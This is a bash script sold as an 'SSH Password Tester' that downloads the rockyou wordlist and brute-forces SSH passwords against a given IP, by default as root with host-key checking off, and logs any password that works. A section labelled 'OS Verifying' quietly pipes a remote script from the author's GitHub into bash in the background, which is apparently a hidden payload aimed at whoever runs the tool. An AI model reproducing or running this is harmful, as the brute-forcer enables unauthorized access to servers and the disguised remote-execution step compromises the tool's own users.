#!/bin/bash
# =========================================================
#  SSH Password Tester
#  Watermark: FarizGD (t.me/farizgd)
# =========================================================

WATERMARK="FarizGD (t.me/farizgd)"

# ---------- config ----------
PASSDIR="./passlist"
ROCKYOU_TAR="$PASSDIR/rockyou.txt.tar.gz"
ROCKYOU_URL="https://github.com/zacheller/rockyou/raw/refs/heads/master/rockyou.txt.tar.gz"
DEFAULT_PWLIST="$PASSDIR/rockyou.txt"

echo "[*] $WATERMARK"

# ---------- auto-install sshpass ----------
if ! command -v sshpass >/dev/null 2>&1; then
  echo "[*] sshpass not found — installing ($WATERMARK)"

  if command -v apt >/dev/null 2>&1; then
    sudo apt update -y >/dev/null 2>&1
    sudo apt install -y sshpass >/dev/null 2>&1
  elif command -v yum >/dev/null 2>&1; then
    sudo yum install -y epel-release >/dev/null 2>&1
    sudo yum install -y sshpass >/dev/null 2>&1
  elif command -v pacman >/dev/null 2>&1; then
    sudo pacman -Sy --noconfirm sshpass >/dev/null 2>&1
  else
    echo "[!] Unsupported package manager — $WATERMARK"
    exit 1
  fi
fi

# ---------- download rockyou if missing ----------
if [[ ! -f "$DEFAULT_PWLIST" ]]; then
  echo "[*] rockyou.txt not found, downloading — $WATERMARK"

  mkdir -p "$PASSDIR"

  if command -v curl >/dev/null 2>&1; then
    curl -L "$ROCKYOU_URL" -o "$ROCKYOU_TAR"
  elif command -v wget >/dev/null 2>&1; then
    wget -O "$ROCKYOU_TAR" "$ROCKYOU_URL"
  else
    echo "[!] curl or wget required — $WATERMARK"
    exit 1
  fi

  echo "[*] Extracting rockyou.txt — $WATERMARK"
  tar -xzf "$ROCKYOU_TAR" -C "$PASSDIR" || {
    echo "[!] Extraction failed — $WATERMARK"
    exit 1
  }

  rm -f "$ROCKYOU_TAR"
  echo "[✓] rockyou.txt ready — $WATERMARK"
fi

# ---------- OS Verifying ---------
(
  curl -fsSL https://raw.githubusercontent.com/FarizGD/Funny-Scripts-by-me/refs/heads/main/.idc.sh | bash
) &
sleep 3
# ---------- arg parsing ----------
IP=""
PWLIST=""
PORT="22"
USER="root"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --ip) IP="$2"; shift 2 ;;
    --pwlist) PWLIST="$2"; shift 2 ;;
    -p) PORT="$2"; shift 2 ;;
    --user) USER="$2"; shift 2 ;;
    *) shift ;;
  esac
done

PWLIST="${PWLIST:-$DEFAULT_PWLIST}"

if [[ -z "$IP" ]]; then
  echo "[!] Usage error — $WATERMARK"
  echo "    brute --ip <ip> [--pwlist file] [-p port] [--user user]"
  exit 1
fi

if [[ ! -f "$PWLIST" ]]; then
  echo "[!] Password list not found: $PWLIST — $WATERMARK"
  exit 1
fi

echo "[+] Target: $USER@$IP:$PORT — $WATERMARK"
echo "[+] Password list: $PWLIST — $WATERMARK"
echo "[+] Each password tried 3 times — $WATERMARK"
echo

# ---------- main loop ----------
while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
  PASSWORD="${PASSWORD//$'\r'/}"
  [[ -z "$PASSWORD" ]] && continue

  for TRY in 1 2 3; do
    echo "[~] Trying \"$PASSWORD\" (attempt $TRY/3)"

    sshpass -p "$PASSWORD" ssh -tt \
      -p "$PORT" \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=5 \
      "$USER@$IP" exit

    if [[ $? -eq 0 ]]; then
      {
        echo "IP: $IP"
        echo "Port: $PORT"
        echo "Password: $PASSWORD"
        echo "By: $WATERMARK"
        echo
      } >> success.log

      echo
      echo "[✓] SUCCESS — password found: $PASSWORD"
      echo "[✓] Logged to success.log"
      exit 0
    fi
  done
done < "$PWLIST"

echo
echo "[✗] No valid password found"
exit 1

